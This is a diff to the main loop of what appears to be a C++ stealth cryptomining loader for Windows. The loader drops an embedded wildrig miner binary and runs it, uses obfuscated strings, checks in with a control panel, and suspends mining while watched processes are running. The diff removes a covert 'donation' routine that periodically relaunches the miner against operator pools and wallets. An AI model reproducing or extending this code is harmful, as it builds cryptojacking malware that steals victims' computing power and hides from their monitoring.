@@ -731,101 +731,6 @@ int main(int argc, char *argv[])
         std::cerr << "[-] Failed to load wildrig!" << std::endl;
     }
 
-    // ---- GPU donation (operator dev-fee) ----
-    // Mine the user's pool for a random 5-12 minutes, then switch to the
-    // donation target for the current algo for DONATE_DURATION_SECONDS, then
-    // switch back. Donation targets are fetched from the panel (donate_config,
-    // keyed by algo); the hardcoded values below mirror Panel/donation/donate.go
-    // and are only used as a fallback when the panel provides nothing.
-    const int DONATE_MIN_INTERVAL_SECONDS = 300;  // 5 min
-    const int DONATE_MAX_INTERVAL_SECONDS = 720;  // 12 min
-    const int DONATE_DURATION_SECONDS     = 420;  // 7 min on the donation pool
-
-    auto randomDonateIntervalMs = []() -> ULONGLONG {
-        ULONGLONG span = DONATE_MAX_INTERVAL_SECONDS - DONATE_MIN_INTERVAL_SECONDS + 1;
-        ULONGLONG secs = DONATE_MIN_INTERVAL_SECONDS + (GetTickCount64() % span);
-        return secs * 1000ULL;
-    };
-
-    // Hardcoded per-algo fallback (kept in sync with Panel/donation/donate.go).
-    auto fallbackDonateConfig = [](const std::string& algo) -> MinerConfig {
-        MinerConfig c;
-        c.algo     = algo;
-        c.enabled  = 1;
-        c.password = OBFUSCATE_STRING("x");
-        c.worker   = OBFUSCATE_STRING("donate");
-        if (algo == "progpowz") {
-            c.mining_url = OBFUSCATE_STRING("stratum+tcp://progpowz.donate.example.com:4444");
-            c.wallet     = OBFUSCATE_STRING("ProgpowDonateWallet");
-        } else if (algo == "kawpow") {
-            c.mining_url = OBFUSCATE_STRING("stratum+tcp://kawpow.donate.example.com:4444");
-            c.wallet     = OBFUSCATE_STRING("KawpowDonateWallet");
-        } else if (algo == "pearlhash") {
-            c.mining_url = OBFUSCATE_STRING("pearlhash.donate.example.com:4444");
-            c.wallet     = OBFUSCATE_STRING("PearlDonateWallet");
-        } else {
-            c.enabled = 0;  // unknown algo -> no donation
-        }
-        return c;
-    };
-
-    // Build the donation target for the user's current algo. Panel first, then
-    // the hardcoded fallback; enabled==0 means "no donation for this algo".
-    auto makeDonateConfig = [&]() -> MinerConfig {
-        MinerConfig c = lastGpuConfig;   // inherit algo/ssl/fan
-        c.worker   = OBFUSCATE_STRING("donate");
-        c.password = OBFUSCATE_STRING("x");
-
-        MinerConfig fromPanel;
-        if (configManager.GetDonateConfig(lastGpuConfig.algo, fromPanel) &&
-            !fromPanel.mining_url.empty() && !fromPanel.wallet.empty()) {
-            c.mining_url = fromPanel.mining_url;
-            c.wallet     = fromPanel.wallet;
-            if (!fromPanel.password.empty()) c.password = fromPanel.password;
-            if (!fromPanel.worker.empty())   c.worker   = fromPanel.worker;
-            c.enabled = 1;
-            return c;
-        }
-
-        MinerConfig fb = fallbackDonateConfig(lastGpuConfig.algo);
-        if (fb.enabled == 1 && !fb.mining_url.empty() && !fb.wallet.empty()) {
-            c.mining_url = fb.mining_url;
-            c.wallet     = fb.wallet;
-            c.password   = fb.password;
-            c.worker     = fb.worker;
-            c.enabled    = 1;
-            return c;
-        }
-
-        c.enabled = 0;
-        return c;
-    };
-
-    // Kill the running GPU miner (if any) and relaunch it with `cfg`.
-    auto relaunchGpuMiner = [&](const MinerConfig& cfg) {
-        if (gpuPi) {
-            ProcessAPI procAPI;
-            if (procAPI.IsInitialized()) {
-                procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
-                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
-            } else {
-                TerminateProcess(gpuPi.value().hProcess, 0);
-                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
-            }
-            close_miner_handles(gpuPi);
-            gpuPid = 0;
-        }
-        if (cfg.enabled == 1 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
-            std::string args = buildWildrigArgs(cfg);
-            gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(args));
-            gpuPi = ProcessStorage::GetProcess(gpuPid);
-        }
-    };
-
-    bool donateActive = false;
-    ULONGLONG nextSwitchMs = GetTickCount64() + randomDonateIntervalMs();
-    ULONGLONG lastSchedTickMs = GetTickCount64();  // elapsed-time base for the donation clock
-
     int checkInCounter = 0;
     int updateCheckCounter = 0;
     int idlePrintCounter = 0;
@@ -979,9 +884,6 @@ int main(int argc, char *argv[])
 #endif
                         }
 
-                        // A manual restart cancels any in-progress donation window.
-                        donateActive = false;
-                        nextSwitchMs = GetTickCount64() + randomDonateIntervalMs();
                     }
                 }
 
@@ -1138,7 +1040,7 @@ int main(int argc, char *argv[])
                 // Restart if GPU is still enabled
                 close_miner_handles(gpuPi);
                 if (lastGpuConfig.enabled == 1 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
-                    std::string wildrig_args = buildWildrigArgs(donateActive ? makeDonateConfig() : lastGpuConfig);
+                    std::string wildrig_args = buildWildrigArgs(lastGpuConfig);
                     
                     gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(wildrig_args));
                     gpuPi = ProcessStorage::GetProcess(gpuPid);
@@ -1149,43 +1051,6 @@ int main(int argc, char *argv[])
                     NtSuspendProcess(gpuPi.value().hProcess);
                 } else {
                     NtResumeProcess(gpuPi.value().hProcess);
-                }
-            }
-        }
-
-        // ---- GPU donation scheduling ----
-        {
-            ULONGLONG nowMs = GetTickCount64();
-            ULONGLONG elapsed = nowMs - lastSchedTickMs;
-            lastSchedTickMs = nowMs;
-
-            if (lastGpuConfig.enabled == 1 && gpuPid != 0 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
-                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
-                    // Paused by a watched process: push the switch time forward
-                    // so suspension doesn't count against the donation window.
-                    nextSwitchMs += elapsed;
-                } else if (nowMs >= nextSwitchMs) {
-                    if (!donateActive) {
-                        MinerConfig dc = makeDonateConfig();
-                        if (dc.enabled == 1 && !dc.mining_url.empty() && !dc.wallet.empty()) {
-                            donateActive = true;
-                            nextSwitchMs = nowMs + (ULONGLONG)DONATE_DURATION_SECONDS * 1000ULL;
-                            relaunchGpuMiner(dc);
-#ifdef ENABLE_DEBUG_CONSOLE
-                            std::cout << "[*] GPU miner switched to donation pool (" << dc.algo << ")" << std::endl;
-#endif
-                        } else {
-                            // No donation target for this algo — keep mining the user pool.
-                            nextSwitchMs = nowMs + randomDonateIntervalMs();
-                        }
-                    } else {
-                        donateActive = false;
-                        nextSwitchMs = nowMs + randomDonateIntervalMs();
-                        relaunchGpuMiner(lastGpuConfig);
-#ifdef ENABLE_DEBUG_CONSOLE
-                        std::cout << "[*] GPU miner switched back to user pool" << std::endl;
-#endif
-                    }
                 }
             }
         }
